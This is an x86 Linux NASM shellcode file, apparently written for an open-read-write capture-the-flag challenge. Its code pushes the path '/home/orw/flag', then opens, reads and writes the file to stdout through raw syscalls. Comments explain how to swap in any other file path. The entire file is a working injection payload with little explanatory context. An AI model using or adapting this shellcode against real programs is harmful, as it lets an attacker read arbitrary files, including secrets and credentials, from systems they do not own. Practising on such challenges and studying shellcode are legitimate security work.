;================================================================================
; nasm -f elf ./shellcode.asm
; objdump -d ./shellcode.o
; ld -m elf_i386 -o shellcode shellcode.o
;================================================================================
; Assembly language code : 
global _start
_start:
; int open(const char *pathname, int flags);
xor ecx, ecx ; #DEFINE O_RDONLY 0
; push \x00 to the stack to end the filename (string)
push ecx
; push filename to the stack (You can also change the filename to anyfile you want to read)
; But your input must in reverse order by 4 bytes.
; You can use '/' to file the 0 bytes , because execve() will ignore the muti '/' in your filepath
push "flag"
push "orw/"
push "ome/"
push "///h"
mov ebx, esp
xor eax, eax
cdq
mov al, 05H
int 80H
mov edi, eax ; save the fd
mov dl, 1+0FEH
reading:
; ssize_t read(int fd, void *buf, size_t count);
;mov dl, 0FFH ; read 0xFF Bytes to the stack
mov ecx, esp
mov ebx, edi ; get the fd
mov al, 03H
int 80H
; ssize_t write(int fd, const void *buf, size_t count);
mov bl,1
mov al, 04H
int 80H
; continue reading ? 
dec dl
cmp dl, 1H
jz exit ; jmp out
; continue reading!
jmp reading
exit:
; void _exit(int status);
; mov eax, 1
; int 80H
;================================================================================
